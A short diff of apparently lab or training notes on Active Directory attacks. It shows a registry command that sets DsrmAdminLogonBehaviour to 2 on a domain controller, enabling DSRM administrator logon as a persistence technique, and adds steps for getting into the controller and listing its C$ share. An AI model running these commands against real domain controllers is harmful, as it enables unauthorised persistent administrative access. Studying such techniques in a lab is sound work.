@@ -77,3 +77,10 @@ Sometime, you will see an error that this propery already exists. That means you
 
 ```Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2```
 
+Now once the logon behaviour is changed, now we can get inside DC using the command mentioned before.
+Once we are in, you might notice that Invoke-Command is not working and file traversal is not possbile that way. 
+For that, you can use:
+
+```ls \\dcorp-dc\C$```
+
+
